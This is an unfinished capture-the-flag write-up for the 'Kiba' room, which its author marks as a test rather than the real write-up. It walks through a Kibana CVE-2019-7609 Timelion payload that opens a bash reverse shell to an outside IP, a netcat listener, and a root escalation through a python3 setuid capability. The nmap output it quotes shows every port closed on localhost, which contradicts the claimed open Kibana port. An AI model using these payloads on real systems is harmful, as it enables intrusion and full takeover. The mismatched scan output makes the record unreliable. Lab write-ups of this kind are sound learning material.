* NOT THE REAL WRITEUP, I JUST DO SOME TEST*
# ROOM : KIBA

## 1. Enumeration

First of all, i have to gather somes informations about this boxes.
I run nmap scan to get open port, version etc.

`nmap -sC -sV {ip}`

3 ports is open as you can see in the result :

```
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-22 09:30 EDT
Nmap scan report for 127.0.0.1
Host is up (0.000072s latency).
All 1000 scanned ports on 127.0.0.1 are in ignored states.
Not shown: 1000 closed tcp ports (conn-refused)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.50 seconds

```

WebServer is empty, just the default apache page. Lets look to the port 5601, who is Kibana.

## 2. Research of exploit !
We found one CVE about Kibana : **CVE-2019-7609**

This CVE can lead to a RCE (Remote Code Execution).

On a shell, i run a listenner to get the reverseshell.

`nc -lnvp 4444`

On the Timelion, i can put the payload :
`
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -i >& /dev/tcp/192.168.0.136/12345 0>&1");process.exit()//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
`
Then run the code and load the canvas page.

Nice, we have the reverse shell.

1st flag obtained !

## 3. Privilege escalation !

We have to look at linux capabilities with getcap.

```getcap -r / 2</dev/null```

We can see python have the setuid capabilite and we can exploit this to get the root.
Using GTFOBins we have the right payload to get the root :

```/home/kiba/.hackmeplease/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'```

We have the root !

(En cours d'écriture..)
